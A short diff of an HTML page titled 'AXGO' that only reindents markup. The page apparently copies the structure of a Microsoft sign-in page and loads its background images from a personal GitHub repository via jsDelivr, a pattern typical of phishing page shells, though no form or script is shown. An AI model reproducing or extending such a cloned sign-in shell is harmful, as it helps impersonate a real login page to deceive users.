@@ -1,4 +1,5 @@
-<html dir="ltr" class="" lang="zh"><head><meta charset="utf-8">
+<html dir="ltr" class="" lang="zh">
+	<head><meta charset="utf-8">
 		<title>AXGO</title>
 		<meta http-equiv="X-UA-Compatible" content="IE=edge">
 		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
@@ -10,14 +11,14 @@
 	<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display:block">
 		<div>
 			<div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr } }">
-					<div data-bind="component: { name: 'background-image-control',
+				<div data-bind="component: { name: 'background-image-control',
 						publicMethods: $page.backgroundControlMethods }">
-						<div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
-							<img src="https://cdn.jsdelivr.net/gh/e5ar/c/V2yY4OL4cURj.svg">
-							<div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://cdn.jsdelivr.net/gh/e5ar/c/a696895f78c19df6c7.svg&quot;);"></div> 
-						</div>
+					<div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
+						<img src="https://cdn.jsdelivr.net/gh/e5ar/c/V2yY4OL4cURj.svg">
+						<div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://cdn.jsdelivr.net/gh/e5ar/c/a696895f78c19df6c7.svg&quot;);"></div> 
 					</div>
 				</div>
+			</div>
 		</div>
 	
-</body></html>
+	</body></html>
